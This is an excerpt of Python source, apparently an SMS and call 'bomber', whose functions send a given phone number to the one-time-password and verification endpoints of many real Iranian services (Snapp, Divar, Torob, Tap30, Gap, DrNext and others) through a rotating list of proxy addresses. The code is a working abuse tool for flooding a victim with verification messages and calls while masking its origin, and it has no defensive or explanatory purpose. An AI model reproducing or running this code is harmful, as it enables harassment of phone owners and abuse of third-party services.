...
PROXIES_LIST = [
    "https://72.56.59.17:61931",
    "https://104.238.30.58:63744",
    "https://72.56.59.62:63133",
    "https://72.56.59.23:61937",
    "http://154.17.228.122:80",
    "https://104.238.30.86:63900"
]
...
def classino(phone):
    ...
    try:
        response = post(classino_url, json=classino_data, proxies=get_proxy(), headers=classino_headers, timeout=5)
...
def smarket(phone):
    ...
    try:
        smarketR = post(url=smarketU, headers=smarketH, proxies=get_proxy(), timeout=5).json()
...
def okorosh(phone):
    ...
    try:
        okR = post(url=okU, headers=okH, json=okJ, proxies=get_proxy(), timeout=5).text
        if 'success' in okR:
...
def snap(phone):
    ...
    try:
        snapR = post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=get_proxy(), timeout=5).text
        if "OK" in snapR:
...
def gap(phone):
    ...
    try:
        gapR = get(url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH, proxies=get_proxy(), timeout=5).text
        if "OK" in gapR:
...
def tap30(phone):
    ...
    try:
        tap30R = post(url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D, proxies=get_proxy(), timeout=5).json()
        if tap30R['result'] == "OK":
...
def divar(phone):
    ...
    try:
        divarR = post(url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD, proxies=get_proxy(), timeout=5).json()
...
def torob(phone):
    ...
    torobH = {'accept': '*/*',
              ...
              'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        torobR = get(url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH, proxies=get_proxy(), timeout=5).json()
...
def one(phone):
    ...
    try:
        response = post(a, data=b, headers=d, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
...
def eyit(phone):
    ...
    try:
        response = post(a, json=b, headers=d, proxies=get_proxy(), timeout=5)
        if response.status_code == 200:
...
def sventtubf(phone):
    ...
    try:
        ...
        post_response1 = post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", json={"mobile": phone}, headers={**headers, "content-type": "application/json;charset=UTF-8", "content-length": "24"}, proxies=get_proxy(), timeout=5)
        ...
        post_response2 = post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", json={"mobile": phone}, headers={**headers, "content-type": "application/json;charset=UTF-8", "content-length": "24"}, proxies=get_proxy(), timeout=5)
